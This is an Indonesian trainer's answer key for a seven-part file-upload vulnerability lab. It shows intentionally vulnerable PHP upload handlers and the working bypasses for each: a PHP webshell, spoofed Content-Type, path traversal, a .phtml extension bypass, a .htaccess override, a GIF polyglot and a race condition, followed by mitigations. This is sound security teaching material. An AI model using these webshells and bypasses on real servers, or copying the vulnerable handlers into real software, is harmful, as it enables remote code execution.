# Kunci Jawaban — File Upload Vulnerabilities Lab

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai.

---

## Lab 1 — Unrestricted Upload (`lab1_unrestricted.php`)

**Kode di server:**
```php
$name = basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . '/uploads/' . $name);
```
Tidak ada pengecekan ekstensi, Content-Type, maupun isi file sama sekali.

**Langkah:** upload file `shell.php` berisi `<?php system($_GET['cmd']); ?>`, lalu akses
`uploads/shell.php?cmd=id`.

**Kenapa berhasil:** direktori `uploads/` berada di dalam webroot dengan eksekusi PHP aktif
(default Apache), jadi file apa pun yang tersimpan di sana dan diminta lewat HTTP akan
diproses oleh interpreter PHP — termasuk memanggil `system()` dengan argumen dari
`$_GET['cmd']`.

---

## Lab 2 — Content-Type Restriction Bypass (`lab2_content_type.php`)

**Kode di server:**
```php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (in_array($_FILES['file']['type'], $allowed_types, true)) {
    move_uploaded_file(...);
}
```

**Payload:**
```bash
curl -s -F "file=@shell.php;type=image/png" http://localhost:8079/upload/lab2_content_type.php
```
**Kenapa berhasil:** `$_FILES['file']['type']` diisi PHP langsung dari header
`Content-Type:` pada bagian multipart yang bersangkutan di request — nilai ini murni klaim
dari CLIENT, tidak pernah diverifikasi ulang terhadap isi file yang sesungguhnya. `curl -F
"file=@shell.php;type=image/png"` memaksa header itu menjadi `image/png` meski isi filenya
tetap kode PHP, dan filenya sendiri tetap disimpan dengan ekstensi asli `.php` (yang memang
dieksekusi Apache).

---

## Lab 3 — Path Traversal (`lab3_path_traversal.php`)

**Kode di server:**
```php
// PHP 8.1+ meng-otomatis-basename() $_FILES['name'] - path aslinya cuma ada di 'full_path'
$name = $_FILES['file']['full_path'] ?? $_FILES['file']['name'];   // TIDAK di-basename()
$dest = __DIR__ . '/uploads_safe/' . $name;
move_uploaded_file($_FILES['file']['tmp_name'], $dest);
```
`uploads_safe/` dikonfigurasi lewat `apache/uploads_safe.conf` untuk menolak eksekusi file
`.php`/`.phtml`/dst (`Require all denied` di dalam `<FilesMatch>`), tapi `uploads/` (folder
lain, dipakai lab-lab lain) tidak punya pembatasan itu.

**Payload:** edit request upload di Burp Repeater, ubah header
`Content-Disposition` bagian file jadi:
```
Content-Disposition: form-data; name="file"; filename="../uploads/shell.php"
```
lalu akses `uploads/shell.php?cmd=id`.

**Kenapa berhasil:** nama file dari field multipart `filename` dipakai mentah untuk membangun
path tujuan tanpa `basename()` atau validasi traversal apa pun. `uploads_safe/../uploads/`
di-resolve filesystem menjadi `uploads/` — file webshell mendarat di direktori yang PHP-nya
aktif, sepenuhnya melewati proteksi "folder aman" yang dirancang untuk avatar. **Catatan PHP
8.1+:** sejak PHP 8.1, `$_FILES['file']['name']` otomatis di-`basename()` oleh PHP sendiri
(fitur ini ditambahkan untuk mendukung upload folder lewat `<input webkitdirectory>`), dan
path asli (kalau ada) dipindah ke field baru `full_path`. Kode lab ini memakai `full_path`
supaya kerentanan klasiknya tetap bisa direproduksi di PHP modern — persis pola yang muncul
kalau developer memang butuh path asli dan tanpa sadar memakai field yang salah.

---

## Lab 4 — Extension Blacklist Bypass (`lab4_blacklist_bypass.php`)

**Kode di server:**
```php
$blacklist = ['php', 'php3', 'php4', 'php5', 'php7'];
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (in_array($ext, $blacklist, true)) { reject(); }
```

**Payload:** upload `shell.phtml` (atau `shell.pht`) berisi kode PHP yang sama.

**Kenapa berhasil:** image `php:8.2-apache` resmi HANYA mengeksekusi `.php` secara default
(lihat `/etc/apache2/conf-available/docker-php.conf`, `<FilesMatch \.php$>`). Lab ini
menambahkan konfigurasi Apache tambahan (`apache/php-legacy-extensions.conf`) yang juga
mengeksekusi `.phtml`/`.pht` sebagai PHP — mensimulasikan environment hosting yang lebih
longgar/legacy (sangat umum ditemukan di dunia nyata). Blacklist di atas melupakan dua varian
ini, sehingga `shell.phtml` lolos validasi tapi tetap dieksekusi penuh sebagai PHP saat
diakses.

> 📌 **Catatan teknis:** kalau target sungguhan memakai image `php:8.2-apache` **resmi tanpa**
> modifikasi konfigurasi seperti ini, hanya `.php` yang benar-benar tereksekusi — trainer bisa
> menyebutkan ini sebagai pengingat bahwa dampak nyata suatu bypass ekstensi selalu bergantung
> pada konfigurasi handler PHP yang berlaku di server target, bukan cuma pada blacklist
> aplikasinya.

---

## Lab 5 — Extension Handling Override via `.htaccess` (`lab5_obfuscated_extension.php`)

**Kode di server:**
```php
$blacklist = ['php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'pht']; // lengkap kali ini
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, $blacklist, true)) {
    move_uploaded_file($tmp, __DIR__ . '/uploads/' . $name);
}
```

**Payload (dua tahap upload):**
```bash
# 1. Upload file bernama persis ".htaccess"
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -s -F "file=@.htaccess" http://localhost:8079/upload/lab5_obfuscated_extension.php

# 2. Upload webshell dengan ekstensi "aman"
curl -s -F "file=@shell.php;filename=shell.jpg" http://localhost:8079/upload/lab5_obfuscated_extension.php

# 3. Trigger
curl -s "http://localhost:8079/upload/uploads/shell.jpg?cmd=id"
```

**Kenapa berhasil:** `pathinfo('.htaccess', PATHINFO_EXTENSION)` mengembalikan string
`"htaccess"` — bukan salah satu dari ketujuh ekstensi di blacklist, jadi file konfigurasi ini
lolos validasi dan tersimpan sebagai `uploads/.htaccess`. Direktori `/var/www/` pada image
`php:8.2-apache` resmi punya `AllowOverride All` (lihat `docker-php.conf`), yang berarti
Apache **membaca dan menghormati** file `.htaccess` di direktori mana pun di dalam webroot —
termasuk yang baru saja di-upload attacker. Baris `AddType application/x-httpd-php .jpg` di
dalamnya memberi tahu Apache untuk memperlakukan SEMUA file `.jpg` di direktori itu (dan di
bawahnya) sebagai PHP mulai saat itu juga. Upload kedua (`shell.jpg`) lolos validasi tanpa
drama sama sekali — `.jpg` bukan ekstensi berbahaya menurut blacklist manapun — tapi begitu
diakses, Apache mengeksekusinya sebagai PHP mengikuti aturan baru dari `.htaccess` attacker.
Blacklist berbasis ekstensi tidak pernah cukup kalau attacker bisa mengubah **definisi**
"berbahaya" itu sendiri.

---

## Lab 6 — Polyglot Web Shell (`lab6_polyglot.php`)

**Kode di server:**
```php
$allowed_ext = ['php', 'phtml'];               // ekstensi PHP memang diizinkan sah
if (in_array($ext, $allowed_ext, true)) {
    $info = @getimagesize($tmp);                // "keamanan tambahan": harus lolos ini
    if ($info !== false) { move_uploaded_file(...); }
}
```

**Payload:**
```bash
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php
```
Upload `shell.php` tersebut, lalu akses `uploads/shell.php?cmd=id`.

**Kenapa berhasil:** `getimagesize()` hanya membaca beberapa byte pertama file untuk mengenali
signature/struktur format gambar (di sini, magic bytes GIF `GIF89a`) — ia berhenti begitu
berhasil membaca dimensi gambar dan **tidak pernah memproses sisa isi file**. File di atas
lolos sebagai "GIF valid" karena header-nya benar, padahal langsung diikuti tag
`<?php ?>` yang berisi payload. Karena ekstensi `.php` memang ada di allowlist (fitur ini
sengaja mengizinkannya untuk theme PHP), Apache tetap memproses seluruh file sebagai PHP saat
diakses — termasuk kode setelah header GIF yang "tidak terlihat" oleh `getimagesize()`.

---

## Lab 7 — Race Condition (`lab7_race_condition.php`)

**Kode di server:**
```php
move_uploaded_file($tmp, $dest);   // 1. file LANGSUNG live & bisa dieksekusi
sleep(3);                          // 2. jeda "proses validasi" (diperlambat utk demo)
if (@getimagesize($dest) === false) {
    unlink($dest);                 // 3. baru dihapus belakangan kalau tidak valid
}
```

**Langkah:**
1. Upload `shell.php` (berisi `<?php system($_GET['cmd']); ?>`) lewat form.
2. **Dalam 3 detik** setelah submit, di tab/terminal lain:
   ```bash
   curl "http://localhost:8079/upload/uploads/shell.php?cmd=id"
   ```
3. Request kedua tiba saat file masih ada di disk (belum sempat divalidasi & dihapus) — output
   `id` ikut tercetak, membuktikan RCE sempat tercapai sebelum file dihapus.

**Kenapa berhasil:** ada jendela waktu antara file DISIMPAN ke direktori executable dan file
SELESAI divalidasi/dihapus. Selama jendela itu berlangsung, file sepenuhnya live dan bisa
diminta lewat HTTP seperti file PHP normal — validasi "belakangan" tidak mencegah eksekusi
yang sudah keburu terjadi lebih dulu. Di dunia nyata jendela ini biasanya hanya beberapa
milidetik (butuh request paralel/concurrent via Burp Turbo Intruder atau multi-thread), lab
ini melebar-lebarkannya jadi 3 detik supaya bisa didemokan manual satu-per-satu.

---

## Ringkasan hasil akhir

| Lab | Teknik | Payload final | Bukti keberhasilan |
|---|---|---|---|
| 1 | Unrestricted upload | `shell.php` | `uploads/shell.php?cmd=id` mengeksekusi `id` |
| 2 | Content-Type bypass | `curl -F "file=@shell.php;type=image/png"` | Upload diterima meski isi PHP |
| 3 | Path traversal | `filename` (`full_path`)`="../uploads/shell.php"` | File mendarat di `uploads/` (executable) |
| 4 | Blacklist bypass | `shell.phtml` | Dieksekusi meski `.php` diblokir |
| 5 | `.htaccess` override | Upload `.htaccess` lalu `shell.jpg` | `.jpg` dieksekusi sebagai PHP |
| 6 | Polyglot | `GIF89a;` + kode PHP, ekstensi `.php` | `getimagesize()` lolos, tetap RCE |
| 7 | Race condition | Upload lalu `curl` dalam &lt;3 detik | `id` tereksekusi sebelum file dihapus |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Allowlist ekstensi ketat & lengkap, dicocokkan terhadap seluruh nama file (Lab 4).
- Deteksi tipe file dari isi sesungguhnya (magic bytes/`finfo`), bukan `Content-Type` client
  (Lab 2) — dan jangan anggap `getimagesize()` lolos = file sepenuhnya aman (Lab 6).
- Regenerasi nama file di server, jangan pernah pakai nama dari input pengguna — ini
  menghilangkan path traversal (Lab 3) **dan** upload file konfigurasi seperti `.htaccess`
  (Lab 5) sekaligus.
- Matikan `AllowOverride` pada direktori upload, atau larang file konfigurasi web server lewat
  allowlist ekstensi yang ketat (Lab 5).
- Simpan upload di luar webroot / direktori dengan eksekusi script dimatikan di level web
  server, bukan cuma asumsi aplikasi.
- Validasi selesai **sebelum** file bisa diakses publik — jangan simpan-lalu-validasi (Lab 7).
